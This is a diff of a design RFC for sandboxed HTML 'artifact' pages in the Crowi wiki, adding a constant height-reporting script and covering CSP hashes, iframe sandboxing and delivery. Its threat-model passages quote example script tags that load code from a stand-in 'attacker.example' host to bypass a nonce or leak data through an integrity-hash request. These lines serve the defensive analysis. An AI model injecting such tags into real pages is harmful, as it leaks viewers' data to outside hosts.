@@ -70,7 +70,7 @@ Everything in the delivery design follows from closing that specific hole.
   2. GET /a/{rev}?t={token}                                  |
   --------------------------------------------------------->|
                           |          verify HMAC, exp, revision match
-                          |          serve stored HTML verbatim
+                          |          serve stored HTML + height reporter
                           |          + CSP, + sandbox, no Set-Cookie
   <---------------------------------------------------------|
                           |                                  |
@@ -93,7 +93,7 @@ Revision { body, type: 'markdown' | 'artifact', ... }   // authoritative
 
 Path uniqueness across Markdown and artifact pages is obtained for free, since both live in `pages` under the existing unique index on path. This is the primary reason for not introducing a separate collection: MongoDB cannot express a uniqueness constraint spanning two collections, so a split would require application-level checks with an unavoidable race window.
 
-`renderedAst` does not exist for artifacts. There is no Markdown AST to derive, and the stored HTML is served verbatim.
+`renderedAst` does not exist for artifacts. There is no Markdown AST to derive; the stored HTML itself is what delivery serves.
 
 ### Interaction with RFC-0009
 
@@ -103,7 +103,7 @@ One adjustment is required. RFC-0009's safety valve triggers on large pastes, wh
 
 ### Normalisation happens at ingest
 
-Validation and normalisation run once, on write, and the result is what gets stored. Read is a byte-for-byte serve. This keeps artifacts free of derived data and makes the served bytes auditable. The single configurable input to delivery is the web-font setting, and turning it off degrades a stored artifact's typography rather than breaking it, so a policy change cannot leave an existing artifact inoperable. See *No external references*.
+Validation and normalisation run once, on write, and the result is what gets stored. Read serves the stored bytes unchanged, followed by one fixed script that reports the document's height (see *Delivery: frame height*). This keeps artifacts free of derived data and keeps the served bytes auditable: everything past the stored bytes is a constant. The single configurable input to delivery is the web-font setting, and turning it off degrades a stored artifact's typography rather than breaking it, so a policy change cannot leave an existing artifact inoperable. See *No external references*.
 
 Ingest rejects, rather than sanitising:
 
@@ -160,7 +160,7 @@ The two font origins in brackets are present only when the web-font setting is e
 
 **Inline code is authorised by hash, not by nonce.** An earlier draft used a per-revision nonce: ingest generated one, injected it onto every accepted inline `<script>` and `<style>`, and recorded it in a reserved `<meta>` so delivery could emit `script-src 'nonce-…'` without reparsing the body. That design is unsound, and the flaw is fatal rather than incidental. A nonce authorises *an element that carries it*, whatever that element loads; and the nonce has to be readable, because it sits in the served bytes. An accepted inline script can therefore read it and append `<script nonce="…" src="https://attacker.example/x.js">`, which the policy then authorises. Every external reference this design rejects at ingest becomes reachable at runtime, which empties the self-contained guarantee of its meaning.
 
-A hash has no such property. `'sha256-…'` matches one exact body of inline code and nothing else, so an attacker-authored element — external or inline — matches no hash and does not run. Ingest computes the digest of each accepted inline block and records it in a reserved `<meta>`; delivery reads those markers and emits the hashes, still serving the stored bytes unchanged. No attribute is injected onto the blocks themselves.
+A hash has no such property. `'sha256-…'` matches one exact body of inline code and nothing else, so an attacker-authored element — external or inline — matches no hash and does not run. Ingest computes the digest of each accepted inline block and records it in a reserved `<meta>`; delivery reads those markers and emits the hashes, still serving the stored bytes unchanged. No attribute is injected onto the blocks themselves. The one hash delivery adds on its own is the height reporter's (see *Delivery: frame height*), which leads `script-src` whether or not the document has scripts of its own.
 
 One residual remains, and it is accepted rather than closed. CSP Level 3 lets a hash-source in `script-src` also match an *external* `<script>` whose `integrity` attribute carries the same hash, and the policy must not rely on browsers declining to implement that. An accepted inline script can therefore append `<script src="https://attacker.example/x.js" integrity="sha256-<its own digest>">` at runtime, and the browser issues that request even under `connect-src 'none'`. Subresource integrity then refuses to run anything but the identical bytes, so no new code executes; what escapes is the request itself, with whatever the script encoded into the URL and the viewer's IP and user agent. No directive closes this path: a nonce is readable by the script that carries it and is strictly weaker, and Trusted Types would break most existing libraries. It is accepted because it takes a deliberately hostile author, exposes only what the artifact itself already knows, cannot reach the Crowi session or API, and is no worse than what an ordinary Markdown page can already do with an external image.
 
@@ -206,6 +206,8 @@ An artifact page keeps the chrome of a Markdown page and replaces only the part 
 - *Generic, kept.* History, rename, delete, like, watch, share, comments. These operate on the page, not the body.
 - *Undefined, hidden.* Portalize. A portal is a page whose Markdown body introduces an index of its children; what an artifact body means in that position has never been defined. It is hidden because the semantics are absent, not because they were considered and rejected — if a use emerges, define the behaviour first and then surface the action.
 
+**Kind.** Above the title sits the pill a portal carries in its header — here the `layout-freeform` glyph and the word *artifact*. The list-row rule below (an icon for a kind, a pill for a state) does not carry over: a header has no state pills beside it to be mistaken for, and the portal header already uses this pill to say what kind of page it is.
+
 **Title.** An artifact must have a title, as any page must. This is not a new artifact-specific rule and needs no new enforcement: it is the existing page requirement, and ingest adds nothing on top of it.
 
 ### Marking artifacts in page lists
@@ -229,6 +231,16 @@ The page shell embeds the artifact with `sandbox="allow-scripts"` and nothing el
 `allow-forms` and `allow-popups` are omitted for the same reason.
 
 The practical cost is that `localStorage` and `sessionStorage` are unavailable inside artifacts. This is not a meaningful loss for the target use case, and agent-authored artifacts are already conventionally written without browser storage.
+
+### Delivery: frame height
+
+The frame is sized to the artifact's content, so the page scrolls as one document instead of carrying a second scrollbar inside the frame. Only the artifact can measure that height: it runs on an opaque origin, so the page cannot read its layout.
+
+Delivery therefore appends one fixed script after the stored document. It observes the document's size and posts `{ type: 'crowi:artifact-height', height }` to the page shell, which sits two frames up. Because the script is a constant, so is its digest, and delivery puts that digest first in `script-src` for every artifact, including one with no scripts of its own. The stored bytes are not touched: the download route serves exactly what was stored, and the fetch–edit–save loop never sees the script.
+
+The page shell accepts a report only from the artifact's window, recognised by identity because its origin is opaque, and only as a finite positive number, capped so that an artifact cannot stretch the page without bound. The artifact's own code can post the same message, which grants it nothing it could not already do by making its content taller. Until a report arrives, the frame keeps a fixed viewport-relative height and the artifact scrolls inside it.
+
+A document sized from the viewport, such as a body with `min-height: 100vh` plus padding, overflows by the same amount at every frame height, so following it would grow the frame forever. The script withholds a report when the viewport has grown since its last one and the overflow is unchanged, and that remainder scrolls inside the frame.
 
 ### No external references
 
@@ -258,7 +270,7 @@ The shell displays a persistent indicator that the frame contains sandboxed, age
 
 **`Revision.type` is authoritative.** Type is a property of the stored bytes. Deriving it from `Page` alone would render historical revisions with the wrong renderer after a type conversion.
 
-**Ingest-time normalisation, verbatim read.** Keeps artifacts free of derived data and makes served bytes auditable.
+**Ingest-time normalisation, unchanged read.** Keeps artifacts free of derived data and keeps served bytes auditable: the stored bytes go out as stored, followed only by the constant height reporter.
 
 **Reject rather than sanitise.** Silent stripping produces silent breakage that the authoring agent cannot diagnose.
 
